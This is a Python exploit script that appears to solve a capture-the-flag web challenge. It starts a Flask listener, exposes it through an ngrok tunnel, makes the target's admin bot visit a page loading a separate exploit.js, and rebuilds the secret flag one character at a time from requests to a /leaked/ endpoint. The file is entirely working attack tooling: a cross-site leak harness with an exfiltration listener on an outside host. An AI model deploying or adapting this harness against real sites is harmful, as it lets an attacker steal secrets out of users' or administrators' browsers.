#!/usr/bin/env python3
import os, re, sys, time, json, logging, threading, requests, urllib.parse
from flask import Flask, Response
from pyngrok import ngrok

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1"
PORT = 8001
TIMEOUT = 20
QUIET_WINDOW = 10
FLAG_PREFIX = "space{"
EXPLOIT_TEMPLATE = open("exploit/exploit.js").read()

def escape_for_regex(text: str) -> str:
    return re.sub(r"[/.?{}]", ".", text)

def make_exploit(public_url: str, base_url: str) -> str:
    body = re.sub(r'const\s+WEBHOOK\s*=\s*".*?";', f'const WEBHOOK = "{public_url}";', EXPLOIT_TEMPLATE, count=1)
    return body

def parse_probe(probe: str):
    flag_index = probe.find("flag=")
    if flag_index == -1:
        return None
    fragment = probe[flag_index + 5 :]
    star_index = fragment.find(".*")
    if star_index == -1:
        return None
    value = fragment[:star_index]
    if not value.startswith(prefix_escaped):
        return None
    tail = value[len(prefix_escaped) :]
    if not tail:
        return None
    pos = len(tail) - 1
    token = tail[-1]
    char = token if token != "." else "?"
    return pos, char

app = Flask(__name__)
mutex = threading.Lock()
flag_chars = []
html_body = ""
exploit_body = ""
prefix_escaped = escape_for_regex(FLAG_PREFIX)
last_update = 0.0

@app.route("/")
def index() -> Response:
    return Response(html_body, mimetype="text/html")

@app.route("/exploit.js")
def exploit() -> Response:
    return Response(exploit_body, mimetype="application/javascript")

@app.route("/leaked/<path:pattern>")
def leaked(pattern: str) -> Response:
    decoded = urllib.parse.unquote(pattern)
    position_char = parse_probe(decoded)
    if position_char is not None:
        pos, ch = position_char
        with mutex:
            while len(flag_chars) <= pos:
                flag_chars.append("?")
            current = flag_chars[pos]
            if current == ch:
                return Response(status=204)
            if current != "?" and ch == "?":
                return Response(status=204)
            flag_chars[pos] = ch
            global last_update
            last_update = time.time()
            logging.info("Recovered #%d --> %s | %s", pos + len(FLAG_PREFIX), ch, FLAG_PREFIX + "".join(flag_chars))
    return Response(status=204)

def start_server() -> threading.Thread:
    thread = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, use_reloader=False, threaded=True),
        daemon=True,
    )
    thread.start()
    return thread

def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)s | %(message)s",
        datefmt="%H:%M:%S",
    )

    global html_body, exploit_body, flag_chars, last_update
    base_url = f"{TARGET.rstrip('/')}/?flag="
    flag_chars.clear()
    last_update = time.time()

    html_template = """<!doctype html><body><script src="{PUBLIC}/exploit.js"></script></body></html>"""

    logging.info("Starting local Flask server on port %d", PORT)
    start_server()

    token = os.environ.get("NGROK_AUTHTOKEN")
    if token:
        ngrok.set_auth_token(token)

    tunnel = None

    try:
        tunnel = ngrok.connect(f"http://127.0.0.1:{PORT}")
        public_url = tunnel.public_url.rstrip("/")
        logging.info("ngrok tunnel: %s", public_url)

        html_body = html_template.replace("{PUBLIC}", public_url)
        exploit_body = make_exploit(public_url, base_url)

        payload = {"url": f"{public_url}/"}
        logging.info("Triggering bot visit to %s", payload["url"])

        res = requests.post(
            f"{TARGET.rstrip('/')}/bot/visit",
            headers={"content-type": "application/json"},
            data=json.dumps(payload),
            timeout=10,
        )
        res.raise_for_status()

        logging.info("Bot accepted the visit. Waiting for leaks...")

        deadline = time.time() + TIMEOUT

        while time.time() < deadline:
            with mutex:
                no_updates = (time.time() - last_update > QUIET_WINDOW) and bool(flag_chars)
            if no_updates:
                break
            time.sleep(0.5)

        with mutex:
            if not flag_chars:
                logging.error("Timeout. No leaks captured.")
                return 1
            if flag_chars[-1] != "}":
                flag_chars[-1] = "}"
            final_flag = FLAG_PREFIX + "".join(flag_chars)

        logging.info("\n\nFlag recovered: %s", final_flag)
        print(final_flag)
        return 0
    except requests.RequestException as exc:
        logging.error("Bot visit failed: %s", exc)
        return 1
    finally:
        if tunnel is not None:
            try:
                ngrok.disconnect(tunnel.public_url)
            except Exception:
                pass

if __name__ == "__main__":
    raise SystemExit(main())